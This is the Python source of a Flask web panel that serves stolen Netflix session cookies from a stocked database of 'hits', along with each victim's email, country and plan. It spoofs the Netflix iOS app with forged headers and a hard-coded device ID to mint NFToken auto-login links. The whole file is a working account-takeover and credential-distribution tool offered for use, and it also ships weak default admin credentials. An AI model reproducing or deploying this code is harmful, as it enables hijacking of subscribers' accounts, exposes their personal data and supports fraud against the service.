import os
import json
import requests
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from functools import wraps
import db_shared as _db

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "nf-web-secret-change-in-prod")

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"
login_manager.login_message = "Please login to continue."

requests.packages.urllib3.disable_warnings()

# ── Netflix iOS FTL API ───────────────────────────────────
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def fetch_nftoken(cookie_dict: dict):
    """Call Netflix iOS FTL API to generate an NFToken. Returns (token, expiry_str) or (None, 'N/A')."""
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "N/A"

    cookie_parts = []
    for k in ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"]:
        if k in cookie_dict:
            cookie_parts.append(f"{k}={cookie_dict[k]}")
    if not cookie_parts:
        cookie_parts = [f"{k}={v}" for k, v in cookie_dict.items()]
    cookie_header = "; ".join(cookie_parts)

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = cookie_header

    try:
        resp = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=15, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            token_data = (
                ((data.get("value") or {}).get("account") or {}).get("token") or {}
            ).get("default") or {}
            token   = token_data.get("token")
            expires = token_data.get("expires")
            if token:
                expiry_str = "N/A"
                if expires:
                    try:
                        if isinstance(expires, int) and len(str(expires)) == 13:
                            expires //= 1000
                        expiry_str = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
                    except Exception:
                        expiry_str = str(expires)
                return token, expiry_str
    except Exception as e:
        print(f"[NFToken Error] {e}")
    return None, "N/A"


class WebUser(UserMixin):
    def __init__(self, row):
        self.id       = row["id"]
        self.username = row["username"]
        self.role     = row["role"]

    def is_admin(self):
        return self.role == "admin"


@login_manager.user_loader
def load_user(user_id):
    row = _db.get_web_user_by_id(int(user_id))
    return WebUser(row) if row else None


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin():
            flash("Access denied. Admins only.", "danger")
            return redirect(url_for("dashboard"))
        return f(*args, **kwargs)
    return decorated


# ── Login ─────────────────────────────────────────────
@app.route("/", methods=["GET", "POST"])
def login():
    if current_user.is_authenticated:
        return redirect(url_for("dashboard"))
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        row = _db.verify_web_user(username, password)
        if row:
            login_user(WebUser(row), remember=True)
            _db.update_last_login(row["id"])
            return redirect(url_for("dashboard"))
        flash("Invalid username or password.", "danger")
    return render_template("login.html")


@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for("login"))


# ── Dashboard ─────────────────────────────────────────
@app.route("/dashboard")
@login_required
def dashboard():
    hits_count = _db.count_hits_db()
    return render_template("dashboard.html", hits_count=hits_count)


# ── Generate Cookie + NFToken ─────────────────────────
@app.route("/generate", methods=["POST"])
@login_required
def generate():
    hit = _db.get_random_hit_full()
    if not hit:
        return jsonify({"success": False, "message": "No cookies available in stock right now. Try again later."})

    bundle = hit["bundle"]

    # Build cookie string (raw)
    cookies_parts = []
    for key in ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", "flwssn", "gsid"]:
        if key in bundle:
            cookies_parts.append(f"{key}={bundle[key]}")
    if not cookies_parts:
        cookies_parts = [f"{k}={v}" for k, v in bundle.items()]
    cookie_str = "; ".join(cookies_parts)

    cookie_txt  = "# Netflix Cookie\n"
    cookie_txt += f"# Email   : {hit['email']}\n"
    cookie_txt += f"# Country : {hit['country']}\n"
    cookie_txt += f"# Quality : {hit['quality']}\n"
    cookie_txt += f"Cookies = {cookie_str}\n"

    # Generate NFToken
    token, token_expiry = fetch_nftoken(bundle)
    direct_url = f"https://netflix.com/browse?nftoken={token}" if token else None
    mobile_url = f"https://netflix.com/unsupported?nftoken={token}" if token else None

    return jsonify({
        "success":       True,
        "email":         hit["email"],
        "country":       hit["country"],
        "quality":       hit["quality"],
        "cookie_str":    cookie_str,
        "cookie_txt":    cookie_txt,
        "nftoken":       token,
        "token_expiry":  token_expiry,
        "direct_url":    direct_url,
        "mobile_url":    mobile_url,
        "hits_remaining": _db.count_hits_db(),
    })


# ── Admin Panel ───────────────────────────────────────
@app.route("/admin")
@login_required
@admin_required
def admin():
    return render_template("admin.html",
                           users=_db.get_all_web_users(),
                           hits_count=_db.count_hits_db())


@app.route("/admin/add-user", methods=["POST"])
@login_required
@admin_required
def admin_add_user():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    role     = request.form.get("role", "user")
    if not username or not password:
        flash("Username and password are required.", "danger")
        return redirect(url_for("admin"))
    if len(password) < 4:
        flash("Password must be at least 4 characters.", "danger")
        return redirect(url_for("admin"))
    ok, err = _db.add_web_user(username, password, role)
    flash(f"User '{username}' added!" if ok else f"Error: {err}",
          "success" if ok else "danger")
    return redirect(url_for("admin"))


@app.route("/admin/delete-user/<int:user_id>", methods=["POST"])
@login_required
@admin_required
def admin_delete_user(user_id):
    if user_id == current_user.id:
        flash("You cannot delete yourself.", "danger")
        return redirect(url_for("admin"))
    _db.delete_web_user(user_id)
    flash("User deleted.", "success")
    return redirect(url_for("admin"))


@app.route("/admin/change-password/<int:user_id>", methods=["POST"])
@login_required
@admin_required
def admin_change_password(user_id):
    new_pass = request.form.get("new_password", "").strip()
    if len(new_pass) < 4:
        flash("Password must be at least 4 characters.", "danger")
        return redirect(url_for("admin"))
    _db.change_web_password(user_id, new_pass)
    flash("Password updated.", "success")
    return redirect(url_for("admin"))


# ── Startup ───────────────────────────────────────────
if __name__ == "__main__":
    _db.init_all()
    _db.init_web_admin(
        os.environ.get("ADMIN_USERNAME", "admin"),
        os.environ.get("ADMIN_PASSWORD", "admin123")
    )
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
